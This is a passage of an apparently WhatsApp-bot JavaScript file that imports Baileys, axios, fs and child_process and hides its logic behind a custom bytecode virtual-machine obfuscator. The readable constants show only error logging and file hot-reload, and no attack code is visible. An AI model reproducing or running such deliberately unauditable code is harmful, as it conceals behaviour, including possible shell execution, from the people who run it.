import {
    generateWAMessageFromContent,
    proto,
    prepareWAMessageMedia,
    downloadContentFromMessage,
} from '@whiskeysockets/baileys';
import vmj from 'axios';
import vmf from 'form-data';
import vmh from 'fs';
import vmI from 'path';
import * as vmi from 'fs';
import vmK from 'chalk';
import { fileURLToPath, pathToFileURL } from 'url';
import { exec, execSync, spawn } from 'child_process';
import vma from 'util';
import { createCanvas, registerFont } from 'canvas';
import { performance } from 'perf_hooks';
import vmt from 'os';
import { fileTypeFromBuffer } from 'file-type';
import vmm from 'yt-search';
import vmd from '@vreden/youtube_scraper';
let vmV =
        typeof globalThis !== 'undefined'
            ? globalThis
            : typeof window !== 'undefined'
              ? window
              : global,
    vmD = Object['defineProperty'],
    vmC = Object['create'],
    vmv = Object['getOwnPropertyDescriptor'],
    vmo = Object['getOwnPropertyNames'],
    vmB = Object['getOwnPropertySymbols'],
    vmz = Object['setPrototypeOf'],
    vmL = Object['getPrototypeOf'],
    vmy_6c9c4d = vmV['vmy_6c9c4d'] || (vmV['vmy_6c9c4d'] = {});
const vmk_86dd04 = (function () {
    let x = [
            {
                i: [
                    0x4b,
                    0x0,
                    0x4,
                    null,
                    0x46,
                    0x1,
                    0x0,
                    0x2,
                    0x1b,
                    null,
                    0x1b,
                    null,
                    0x8,
                    0x0,
                    0x1b,
                    null,
                    0x1b,
                    null,
                    0x0,
                    0x3,
                    0x37,
                    0x2,
                    0x3,
                    null,
                    0x1,
                    null,
                    0x38,
                    null,
                ],
                c: ['console', 'error', 'Caught\x20exception:', 0x2],
                p: 0x1,
                l: 0x0,
                sp: 0x1,
            },
            {
                i: [
                    0x4b,
                    0x0,
                    0x4,
                    null,
                    0x46,
                    0x1,
                    0x4b,
                    0x2,
                    0x1b,
                    null,
                    0x1b,
                    null,
                    0x0,
                    0x3,
                    0x37,
                    0x1,
                    0x3,
                    null,
                    0x4b,
                    0x4,
                    0x4,
                    null,
                    0x46,
                    0x5,
                    0x4b,
                    0x6,
                    0x46,
                    0x7,
                    0x4,
                    null,
                    0x46,
                    0x8,
                    0x0,
                    0x9,
                    0x1b,
                    null,
                    0x1b,
                    null,
                    0x0,
                    0x3,
                    0x37,
                    0x1,
                    0x1b,
                    null,
                    0x1b,
                    null,
                    0x4b,
                    0x6,
                    0x46,
                    0xa,
                    0x4,
                    null,
                    0x46,
                    0x8,
                    0x4b,
                    0x2,
                    0x1b,
                    null,
                    0x1b,
                    null,
                    0x0,
                    0x3,
                    0x37,
                    0x1,
                    0x1b,
                    null,
                    0x1b,
                    null,
                    0x0,
                    0xb,
                    0x37,
                    0x2,
                    0x3,
                    null,
                    0x0,
                    0xc,
                    0x4b,
                    0x2,
                    0x4b,
                    0xd,
                    0x0,
                    0x3,
                    0x36,
                    0x1,
                    0x46,
                    0xe,
                    0xa,
                    null,
                    0x0,
                    0xf,
                    0xa,
                    null,
                    0x4b,
                    0x10,
                    0x4,
                    null,
                    0x46,
                    0x11,
                    0x0,
                    0x12,
                    0x37,
                    0x0,
                    0xa,
                    null,
                    0x6a,
                    null,
                    0x3,
                    null,
                    0x1,
                    null,
                    0x38,
                    null,
                ],
                c: [
                    'fsSync',
                    'unwatchFile',
                    '__filename',
                    0x1,
                    'console',
                    'log',
                    'chalk',
                    'white',
                    'bold',
                    '~>\x20Update\x20File\x20:',
                    'green',
                    0x2,
                    '',
                    'pathToFileURL',
                    'href',
                    '?update=',
                    'Date',
                    'now',
                    0x0,
                ],
                p: 0x0,
                l: 0x0,
                sp: 0x1,
            },
        ],
        u = (function () {
            let S = x;
            x = null;
            let A = null;
            for (let X = 0x0; X < S['length']; X++) {
                let w = S[X];
                if (w && w['c'])
                    for (let W = 0x0; W < w['c']['length']; W++) {
                        let s = w['c'][W];
                        if (
                            typeof s === 'string' &&
                            s['length'] > 0x1 &&
                            s[s['length'] - 0x1] === 'n'
                        )
                            try {
                                w['c'][W] = BigInt(s['slice'](0x0, -0x1));
                            } catch (Y) {}
                    }
            }
            let p = {};
            return function (O) {
                let c = A ? A[O] : O;
                if (c in p) return p[c];
                return ((p[c] = S[c]), (S[c] = null), p[c]);
            };
        })(),
        U = {
            0: 0x8d,
            1: 0x17e,
            2: 0x59,
            3: 0x1cc,
            4: 0x123,
            5: 0x1e0,
            6: 0x12e,
            7: 0x11c,
            8: 0xe,
            9: 0x11a,
            10: 0xfd,
            11: 0x6e,
            12: 0x190,
            13: 0x1f6,
            14: 0xc4,
            15: 0x1d4,
            16: 0x4c,
            17: 0x10f,
            18: 0xb7,
            19: 0x148,
            20: 0xb3,
            21: 0x1d7,
            22: 0x3c,
            23: 0x14d,
            24: 0xba,
            25: 0xcc,
            26: 0x4e,
            27: 0x111,
            28: 0x81,
            32: 0x5a,
            40: 0x183,
            41: 0x109,
            42: 0xce,
            43: 0xf0,
            44: 0x1ab,
            45: 0x8a,
            46: 0x1b1,
            47: 0xdf,
            50: 0x11f,
            51: 0x1aa,
            52: 0xe4,
            53: 0x1da,
            54: 0xa7,
            55: 0x144,
            56: 0x120,
            57: 0x1c9,
            58: 0x28,
            59: 0x13d,
            60: 0x1d2,
            61: 0xbf,
            62: 0x14e,
            63: 0x1b2,
            64: 0x139,
            65: 0x19f,
            70: 0x1bb,
            71: 0x1e5,
            72: 0x24,
            73: 0x147,
            74: 0xcb,
            75: 0x1a5,
            76: 0x112,
            77: 0x102,
            78: 0x94,
            79: 0x25,
            80: 0x44,
            81: 0x142,
            82: 0x0,
            83: 0x5b,
            84: 0x10,
            90: 0x4,
            91: 0x18f,
            92: 0xdb,
            93: 0x1fb,
            94: 0x1c1,
            95: 0x1c0,
            100: 0x1ce,
            101: 0xe5,
            102: 0x4b,
            103: 0x1ba,
            104: 0x1e2,
            105: 0x29,
            106: 0x12,
            107: 0x6f,
            110: 0x194,
            111: 0x40,
            112: 0xbe,
            120: 0xd2,
            121: 0xe7,
            122: 0x170,
            123: 0x130,
            124: 0x18,
            125: 0x62,
            126: 0x186,
            127: 0x10d,
            128: 0x16c,
            129: 0x180,
            130: 0x179,
            131: 0x1ca,
            132: 0x196,
            140: 0x7d,
            141: 0x27,
            142: 0x38,
            143: 0x11e,
            144: 0x8e,
            145: 0x56,
            146: 0xc7,
            147: 0x1e9,
            148: 0x1d9,
            149: 0xfa,
            150: 0x43,
            151: 0x68,
            152: 0x192,
            153: 0x13f,
            154: 0x14a,
            155: 0x1e3,
            156: 0x1a9,
            157: 0x18d,
            158: 0x9f,
            160: 0xe6,
            161: 0x14,
            162: 0x1,
            163: 0xde,
            164: 0x78,
            165: 0x18a,
            166: 0x33,
            167: 0x74,
            168: 0x1b6,
            169: 0x13b,
            180: 0x1eb,
            181: 0x1f2,
            182: 0xea,
            183: 0x172,
            184: 0x1f8,
            185: 0x41,
            200: 0xab,
            201: 0x2c,
            202: 0x108,
            210: 0x71,
            211: 0xd3,
            212: 0xb6,
            213: 0x1d5,
            214: 0x65,
            215: 0x156,
            216: 0x15b,
            217: 0x88,
            218: 0x1a0,
            219: 0x1f3,
            220: 0x175,
            250: 0xd4,
            251: 0xe2,
            252: 0xb9,
            253: 0x3b,
            254: 0x168,
            255: 0xd1,
            256: 0x16a,
            257: 0x6,
            258: 0x13a,
            259: 0x1ea,
            260: 0xa0,
            261: 0x67,
        };
    const G = {},
        k = 0x1,
        H = 0x2,
        b = 0x3,
        q = 0x4,
        y = 0x78,
        F = 0x79,
        M = 0x7a;
    let V = new WeakSet(),
        R = new WeakSet();
    function E(S, A, p) {
        try {
            vmD(S, A, p);
        } catch (X) {}
    }
    function D(S, A) {
        let p = [];
        for (let X = 0x0; X < A; X++) {
            let w = S();
            if (w && typeof w === 'object' && V['has'](w)) {
                let W = w['value'];
                if (Array['isArray'](W))
                    for (let s = W['length'] - 0x1; s >= 0x0; s--) {
                        p['push'](W[s]);
                    }
            } else p['push'](w);
        }
        return (p['reverse'](), p);
    }
    function C(S) {
        let A = [];
        for (let p in S) {
            A['push'](p);
        }
        return A;
    }
    function v(S) {
        let A = [];
        for (let p = 0x0; p < S['length']; p++) {
            A['push'](S[p]);
        }
        return A;
    }
    function o(S) {
        return typeof S === 'function' && S['prototype'] ? S['prototype'] : S;
    }
    function B(S) {
        if (typeof S === 'function') return vmL(S);
        let A = vmL(S),
            p = A && A['constructor'] && A['constructor']['prototype'] === A;
        if (p) return vmL(A);
        return A;
    }
    function z(S, A) {
        let p = S;
        while (p !== null) {
            let X = vmv(p, A);
            if (X) return { desc: X, proto: p };
            p = vmL(p);
        }
        return { desc: null, proto: S };
    }
    function L(S, A) {
        if (!S['_$0SKFtw']) return;
        A in S['_$0SKFtw'] && delete S['_$0SKFtw'][A];
        let p = A['split']('$$')[0x0];
        p !== A && p in S['_$0SKFtw'] && delete S['_$0SKFtw'][p];
    }
    function j(S, A) {
        let p = S;
        while (p) {
            (L(p, A), (p = p['_$lQV5eu']));
        }
    }
    function f(S, A, p, X) {
        if (X) {
            let w = Reflect['set'](S, A, p);
            if (!w)
                throw new TypeError(
                    'Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27' +
                        String(A) +
                        '\x27\x20of\x20object'
                );
        } else Reflect['set'](S, A, p);
    }
    function h() {
        return (
            !vmy_6c9c4d['_$CPX09T'] && (vmy_6c9c4d['_$CPX09T'] = new Map()),
            vmy_6c9c4d['_$CPX09T']
        );
    }
    function I() {
        return vmy_6c9c4d['_$CPX09T'] || null;
    }
    function i(S, A, p) {
        if (S['ni'] === undefined || !p) return;
        let X = S['c'][S['ni']];
        ((A['_$3NkOio'][X] = p),
            S['nfe'] && (!A['_$RWHr5N'] && (A['_$RWHr5N'] = {}), (A['_$RWHr5N'][X] = !![])),
            E(p, 'name', { value: X, writable: ![], enumerable: ![], configurable: !![] }));
    }
    function K(S) {
        return '_$VV3lI7' + S['substring'](0x1) + '_$yROPtS';
    }
    function a(S) {
        return '_$d9i5Pn' + S['substring'](0x1) + '_$TYH1Y4';
    }
    function t(S, A, p, X, w, W, s) {
        let Y,
            O = w
                ? function (c) {
                      return c === W ? [undefined, ![]] : [s, !![]];
                  }
                : function (c) {
                      return [s, !![]];
                  };
        return (
            (Y = function c() {
                let l = A(arguments),
                    x0 = new.target !== undefined ? new.target : vmy_6c9c4d['_$4gk5HF'],
                    [x1, x2] = O(this);
                if (x2) return S['call'](this, p, l, X, Y, x0, x1);
                return S(p, l, X, Y, x0, x1);
            }),
            Y
        );
    }
    function m(S, A, p, X, w, W, s) {
        let Y,
            O = w
                ? function (c) {
                      return c === W ? [undefined, ![]] : [s, !![]];
                  }
                : function (c) {
                      return [s, !![]];
                  };
        return (
            (Y = async function c() {
                let l = A(arguments),
                    x0 = new.target !== undefined ? new.target : vmy_6c9c4d['_$4gk5HF'],
                    [x1, x2] = O(this);
                if (x2) return await S['call'](this, p, l, X, Y, x0, undefined, x1);
                return await S(p, l, X, Y, x0, undefined, x1);
            }),
            Y
        );
    }
    function d(S, A, p, X, w, W, s, Y) {
        let O,
            c = W
                ? function (l) {
                      return l === s ? [undefined, ![]] : [Y, !![]];
                  }
                : function (l) {
                      return [Y, !![]];
                  };
        return (
            (O = function l() {
                let x0 = A(arguments),
                    [x1, x2] = c(this);
                if (x2) return S['call'](this, p, x0, X, O, undefined, x1);
                return S(p, x0, X, O, undefined, x1);
            }),
            w['add'](O),
            O
        );
    }
    function n(S, A, p, X) {
        let w;
        return (
            (w = {
                srHXZw: (...W) => {
                    return S(A, W, p, w, undefined, X);
                },
            }['srHXZw']),
            w
        );
    }
    function g(S, A, p, X) {
        let w;
        return (
            (w = {
                srHXZw: async (...W) => {
                    return await S(A, W, p, w, undefined, undefined, X);
                },
            }['srHXZw']),
            w
        );
    }
    function J(S, A, p, X, w, W, s) {
        let Y,
            O = w
                ? function (c) {
                      return c === W ? [undefined, ![]] : [s, !![]];
                  }
                : function (c) {
                      return [s, !![]];
                  };
        return (
            (Y = {
                srHXZw() {
                    let c = A(arguments),
                        l = new.target !== undefined ? new.target : vmy_6c9c4d['_$4gk5HF'],
                        [x0, x1] = O(this);
                    if (x1) return S['call'](this, p, c, X, Y, l, x0);
                    return S(p, c, X, Y, l, x0);
                },
            }['srHXZw']),
            Y
        );
    }
    function N(S, A, p, X, w, W, s) {
        let Y,
            O = w
                ? function (c) {
                      return c === W ? [undefined, ![]] : [s, !![]];
                  }
                : function (c) {
                      return [s, !![]];
                  };
        return (
            (Y = {
                async srHXZw() {
                    let c = A(arguments),
                        l = new.target !== undefined ? new.target : vmy_6c9c4d['_$4gk5HF'],
                        [x0, x1] = O(this);
                    if (x1) return await S['call'](this, p, c, X, Y, l, undefined, x0);
                    return await S(p, c, X, Y, l, undefined, x0);
                },
            }['srHXZw']),
            Y
        );
    }
    function Q(S, A, p, X, w, W) {
        let s = [],
            Y = 0x0,
            O = new Array((S['p'] || 0x0) + (S['l'] || 0x0)),
            c = 0x0,
            l = S['c'],
            x0 = S['i'],
            x1 = S['j'] || {},
            x2 = S['x'] || {},
            x3 = x0['length'] >> 0x1,
            x4 = (xN) => xN << 0x1,
            x5 = (xN) => (xN << 0x1) + 0x1,
            x6 = [],
            x7 = null,
            x8 = { ['_$csazO3']: ![], ['_$VmqNsa']: undefined },
            x9 = { ['_$Mn6sWY']: ![], ['_$2fOqlh']: 0x0 },
            xx = { ['_$8bHCYf']: ![], ['_$vsoyHz']: 0x0 },
            xu = S['o'] || U,
            xU = !!S['st'],
            xG = !!S['sp'],
            xk = !!S['dc'],
            xH = !!S['nte'],
            xb = W,
            xq = !!S['a'];
        !xU && !xq && (W === undefined || W === null) && (W = vmV);
        var xy = 0x0,
            xF = null,
            xM = null;
        let xV = S['seKey'],
            xR,
            xE,
            xD,
            xC,
            xv,
            xo;
        if (xV !== undefined) {
            let xN = (xQ) =>
                typeof xQ === 'number' &&
                Number['isFinite'](xQ) &&
                Number['isInteger'](xQ) &&
                xQ >= -0x80000000 &&
                xQ <= 0x7fffffff &&
                !Object['is'](xQ, -0x0)
                    ? (xQ ^ xV) | 0x0
                    : xQ;
            ((xR = (xQ) => {
                s[Y++] = xN(xQ);
            }),
                (xE = () => xN(s[--Y])),
                (xD = () => xN(s[Y - 0x1])),
                (xC = (xQ) => {
                    s[Y - 0x1] = xN(xQ);
                }),
                (xv = (xQ) => xN(s[Y - xQ])),
                (xo = (xQ, xZ) => {
                    s[Y - xQ] = xN(xZ);
                }));
        } else
            ((xR = (xQ) => {
                s[Y++] = xQ;
            }),
                (xE = () => s[--Y]),
                (xD = () => s[Y - 0x1]),
                (xC = (xQ) => {
                    s[Y - 0x1] = xQ;
                }),
                (xv = (xQ) => s[Y - xQ]),
                (xo = (xQ, xZ) => {
                    s[Y - xQ] = xZ;
                }));
        let xB = (xQ) => xQ,
            xz = { ['_$lQV5eu']: p, ['_$3NkOio']: vmC(null) };
        if (A)
            for (let xQ = 0x0; xQ < Math['min'](A['length'], S['p'] || 0x0); xQ++) {
                O[xQ] = A[xQ];
            }
        let xL = xU && A ? v(A) : null,
            xe = null,
            xj = ![];
        xH &&
            (!xz['_$0SKFtw'] && (xz['_$0SKFtw'] = vmC(null)), (xz['_$0SKFtw']['__this__'] = !![]));
        i(S, xz, X);
        while (c < x3) {
            try {
                while (c < x3) {
                    let xZ = x0[x4(c)],
                        xP = xZ,
                        xr = xu[xP],
                        xT = x0[x5(c)],
                        xS = xT === null ? undefined : xT;
                    if (typeof xJ === 'undefined')
                        var xf = ![],
                            xh,
                            xI = ![],
                            xi = ![],
                            xK = ![],
                            xa = ![],
                            xt = ![],
                            xm = undefined,
                            xd = null,
                            xn = null,
                            xg = {
                                0x0: 0x26,
                                0x1: 0x14,
                                0x2: 0x43,
                                0x3: 0x10,
                                0x4: 0x5a,
                                0x5: 0x59,
                                0x6: 0x4d,
                                0x7: 0x64,
                                0x8: 0x70,
                                0x9: 0x6,
                                0xa: 0x8e,
                                0xb: 0x73,
                                0xc: 0x88,
                                0xd: 0x75,
                                0xe: 0x55,
                                0xf: 0x48,
                                0x10: 0x7b,
                                0x11: 0x89,
                                0x12: 0x2c,
                                0x13: 0x62,
                                0x14: 0x12,
                                0x15: 0x76,
                                0x16: 0x72,
                                0x17: 0x5c,
                                0x18: 0x30,
                                0x19: 0x18,
                                0x1a: 0x2f,
                                0x1b: 0x22,
                                0x1c: 0x60,
                                0x20: 0x31,
                                0x28: 0x32,
                                0x29: 0x2b,
                                0x2a: 0x6a,
                                0x2b: 0x6b,
                                0x2c: 0x8f,
                                0x2d: 0x4a,
                                0x2e: 0x40,
                                0x2f: 0x36,
                                0x32: 0x29,
                                0x33: 0x87,
                                0x34: 0x80,
                                0x35: 0x3a,
                                0x36: 0x2,
                                0x37: 0x49,
                                0x38: 0x5f,
                                0x39: 0x8c,
                                0x3a: 0x16,
                                0x3b: 0x46,
                                0x3c: 0x20,
                                0x3d: 0x1a,
                                0x3e: 0x85,
                                0x3f: 0x57,
                                0x40: 0xf,
                                0x46: 0x1c,
                                0x47: 0x7d,
                                0x48: 0x74,
                                0x49: 0x5d,
                                0x4a: 0x5e,
                                0x4b: 0x33,
                                0x4c: 0x2a,
                                0x4d: 0x61,
                                0x4e: 0x90,
                                0x4f: 0x84,
                                0x51: 0x54,
                                0x52: 0x42,
                                0x53: 0x58,
                                0x54: 0x2d,
                                0x5a: 0x23,
                                0x5b: 0x83,
                                0x5d: 0x17,
                                0x5e: 0x21,
                                0x5f: 0x91,
                                0x64: 0x34,
                                0x68: 0x6e,
                                0x69: 0x27,
                                0x6a: 0x1b,
                                0x6e: 0x52,
                                0x6f: 0x50,
                                0x70: 0x9,
                                0x7b: 0x41,
                                0x7c: 0x25,
                                0x7f: 0x3d,
                                0x80: 0x63,
                                0x81: 0x4b,
                                0x82: 0x79,
                                0x83: 0x8,
                                0x84: 0x51,
                                0x8c: 0x24,
                                0x8d: 0x65,
                                0x8e: 0x45,
                                0x8f: 0x7f,
                                0x90: 0x3e,
                                0x91: 0x2e,
                                0x92: 0xc,
                                0x93: 0x68,
                                0x94: 0x92,
                                0x95: 0x7e,
                                0x96: 0x39,
                                0x97: 0x3c,
                                0x98: 0x78,
                                0x99: 0x81,
                                0x9a: 0xd,
                                0x9b: 0x8a,
                                0x9c: 0x4f,
                                0x9d: 0x1e,
                                0x9e: 0x1d,
                                0xa0: 0x28,
                                0xa1: 0x1f,
                                0xa2: 0x35,
                                0xa3: 0x66,
                                0xa4: 0x13,
                                0xa5: 0x37,
                                0xa6: 0x0,
                                0xa7: 0x82,
                                0xa8: 0x53,
                                0xa9: 0x93,
                                0xb4: 0x8b,
                                0xb5: 0x69,
                                0xb6: 0x4,
                                0xb7: 0x6f,
                                0xb8: 0x56,
                                0xb9: 0x7,
                                0xc8: 0x67,
                                0xc9: 0x5b,
                                0xca: 0xa,
                                0xd2: 0x6d,
                                0xd3: 0x86,
                                0xd4: 0x11,
                                0xd5: 0x8d,
                                0xd6: 0xe,
                                0xd7: 0x1,
                                0xd8: 0x47,
                                0xd9: 0x5,
                                0xda: 0x15,
                                0xdb: 0x4c,
                                0xdc: 0x3,
                                0xfa: 0x7a,
                                0xfb: 0x38,
                                0xfc: 0xb,
                                0xfd: 0x4e,
                                0xfe: 0x19,
                                0xff: 0x77,
                                0x100: 0x3b,
                                0x101: 0x6c,
                                0x102: 0x7c,
                                0x103: 0x3f,
                                0x104: 0x44,
                                0x105: 0x71,
                            },
                            xJ = [
                                function (xA) {
                                    while (!![]) {
                                        (xR(vmE[xA]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = l[xA],
                                            xX = xE();
                                        (L(xn, xp), (xn['_$3NkOio'][xp] = xX), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = vmy_6c9c4d['_$nqVw0B'];
                                        vmy_6c9c4d['_$nqVw0B'] = undefined;
                                        try {
                                            let xW = xX['apply'](undefined, D(xE, xp));
                                            xR(xW);
                                        } finally {
                                            vmy_6c9c4d['_$nqVw0B'] = xw;
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = l[xA];
                                        if (xI && !(xX in vmV) && !(xX in vmy_6c9c4d))
                                            throw new ReferenceError(
                                                xX + '\x20is\x20not\x20defined'
                                            );
                                        ((vmy_6c9c4d[xX] = xp), (vmV[xX] = xp), xR(xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = xD(),
                                            xW = o(xw);
                                        (vmD(xW, xX, {
                                            get: xp,
                                            enumerable: xW === xw,
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = l[xA],
                                            xX = xE();
                                        (L(xn, xp), (xn['_$3NkOio'][xp] = xX));
                                        !xn['_$NJY3Sg'] && (xn['_$NJY3Sg'] = {});
                                        ((xn['_$NJY3Sg'][xp] = !![]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        ((A[xA] = xE()), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = xD();
                                        (vmD(xw, xX, {
                                            set: xp,
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        xp && typeof xp['return'] === 'function'
                                            ? xR(Promise['resolve'](xp['return']()))
                                            : xR(Promise['resolve']());
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = l[xA];
                                        xp in vmy_6c9c4d
                                            ? xR(typeof vmy_6c9c4d[xp])
                                            : xR(typeof vmV[xp]);
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        ((xf = !![]), (xh = Y > 0x0 ? xE() : undefined));
                                        return;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xA & 0xffff,
                                            xX = xA >>> 0x10;
                                        (xR(O[xp] + l[xX]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xD(),
                                            xw = l[xA],
                                            xW = o(xX);
                                        (vmD(xW, xw, {
                                            set: xp,
                                            enumerable: xW === xX,
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = l[xA],
                                            xW = null,
                                            xs = I();
                                        if (xs) {
                                            let xc = xs['get'](xw);
                                            xc && xc['has'](xX) && (xW = xc['get'](xX));
                                        }
                                        if (xW === null) {
                                            let xl = a(xw);
                                            xl in xX && (xW = xX[xl]);
                                        }
                                        if (xW === null)
                                            throw new TypeError(
                                                'Cannot\x20read\x20private\x20member\x20' +
                                                    xw +
                                                    '\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it'
                                            );
                                        if (typeof xW !== 'function')
                                            throw new TypeError(
                                                xw + '\x20is\x20not\x20a\x20function'
                                            );
                                        let xY = D(xE, xp),
                                            xO = xW['apply'](xX, xY);
                                        (xR(xO), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        xn && xn['_$lQV5eu'] && (xn = xn['_$lQV5eu']);
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xB(x1[c]);
                                        if (x6['length'] > 0x0) {
                                            let xX = x6[x6['length'] - 0x1];
                                            if (
                                                xX['_$Vdn9lU'] !== undefined &&
                                                xp >= xX['_$2AXo24']
                                            ) {
                                                ((xx['_$8bHCYf'] = !![]),
                                                    (xx['_$vsoyHz'] = xp),
                                                    (c = xX['_$Vdn9lU']));
                                                break;
                                            }
                                        }
                                        c = xp;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xE(), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = l[xA],
                                            xX = xE(),
                                            xw = xn,
                                            xW = ![];
                                        while (xw) {
                                            if (xw['_$0SKFtw'] && xp in xw['_$0SKFtw'])
                                                throw new ReferenceError(
                                                    'Cannot\x20access\x20\x27' +
                                                        xp +
                                                        '\x27\x20before\x20initialization'
                                                );
                                            if (xw['_$3NkOio'] && xp in xw['_$3NkOio']) {
                                                if (xw['_$RWHr5N'] && xp in xw['_$RWHr5N']) {
                                                    if (xI)
                                                        throw new TypeError(
                                                            'Assignment\x20to\x20constant\x20variable.'
                                                        );
                                                    xW = !![];
                                                    break;
                                                }
                                                if (xw['_$NJY3Sg'] && xp in xw['_$NJY3Sg'])
                                                    throw new TypeError(
                                                        'Assignment\x20to\x20constant\x20variable.'
                                                    );
                                                ((xw['_$3NkOio'][xp] = xX), (xW = !![]));
                                                break;
                                            }
                                            xw = xw['_$lQV5eu'];
                                        }
                                        if (!xW) {
                                            if (xp in vmy_6c9c4d) vmy_6c9c4d[xp] = xX;
                                            else xp in vmV ? (vmV[xp] = xX) : (vmV[xp] = xX);
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX & xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(w), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(undefined), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = l[xA];
                                        !xn['_$0SKFtw'] && (xn['_$0SKFtw'] = {});
                                        ((xn['_$0SKFtw'][xp] = !![]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = x2[c];
                                        (x6['push']({
                                            ['_$xhxcOJ']: xp[0x0] >= 0x0 ? xB(xp[0x0]) : undefined,
                                            ['_$Vdn9lU']: xp[0x1] >= 0x0 ? xB(xp[0x1]) : undefined,
                                            ['_$2AXo24']: xp[0x2] >= 0x0 ? xB(xp[0x2]) : undefined,
                                            ['_$KMG5He']: Y,
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = { value: xp };
                                        (V['add'](xX), xR(xX), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX >> xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xA & 0xffff,
                                            xX = xA >>> 0x10;
                                        (xR(O[xp] * l[xX]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        if (x6['length'] > 0x0) {
                                            let xp = x6[x6['length'] - 0x1];
                                            xp['_$Vdn9lU'] === c &&
                                                (xp['_$SGa8YC'] !== undefined &&
                                                    (x7 = xp['_$SGa8YC']),
                                                x6['pop']());
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        (xR(import(xp)), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = l[xA];
                                        if (xp === null || xp === undefined)
                                            throw new TypeError(
                                                'Cannot\x20read\x20property\x20\x27' +
                                                    String(xX) +
                                                    '\x27\x20of\x20' +
                                                    xp
                                            );
                                        (xR(xp[xX]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = l[xA],
                                            xW = I();
                                        if (xW) {
                                            let xO = 'set_' + xw,
                                                xc = xW['get'](xO);
                                            if (xc && xc['has'](xX)) {
                                                let u0 = xc['get'](xX);
                                                (u0['call'](xX, xp), xR(xp), c++);
                                                break;
                                            }
                                            let xl = xW['get'](xw);
                                            if (xl && xl['has'](xX)) {
                                                (xl['set'](xX, xp), xR(xp), c++);
                                                break;
                                            }
                                        }
                                        let xs =
                                            '_$d9i5Pn' + 'set_' + xw['substring'](0x1) + '_$TYH1Y4';
                                        if (xs in xX) {
                                            let u1 = xX[xs];
                                            (u1['call'](xX, xp), xR(xp), c++);
                                            break;
                                        }
                                        let xY = K(xw);
                                        if (xY in xX) {
                                            ((xX[xY] = xp), xR(xp), c++);
                                            break;
                                        }
                                        throw new TypeError(
                                            'Cannot\x20write\x20private\x20member\x20' +
                                                xw +
                                                '\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it'
                                        );
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = l[xA],
                                            xw = I();
                                        if (xw) {
                                            let xY = 'get_' + xX,
                                                xO = xw['get'](xY);
                                            if (xO && xO['has'](xp)) {
                                                let xl = xO['get'](xp);
                                                (xR(xl['call'](xp)), c++);
                                                break;
                                            }
                                            let xc = xw['get'](xX);
                                            if (xc && xc['has'](xp)) {
                                                (xR(xc['get'](xp)), c++);
                                                break;
                                            }
                                        }
                                        let xW =
                                            '_$d9i5Pn' + 'get_' + xX['substring'](0x1) + '_$TYH1Y4';
                                        if (xW in xp) {
                                            let u0 = xp[xW];
                                            (xR(u0['call'](xp)), c++);
                                            break;
                                        }
                                        let xs = K(xX);
                                        if (xs in xp) {
                                            (xR(xp[xs]), c++);
                                            break;
                                        }
                                        throw new TypeError(
                                            'Cannot\x20read\x20private\x20member\x20' +
                                                xX +
                                                '\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it'
                                        );
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        if (xe === null) {
                                            if (xI || !xi) {
                                                xe = [];
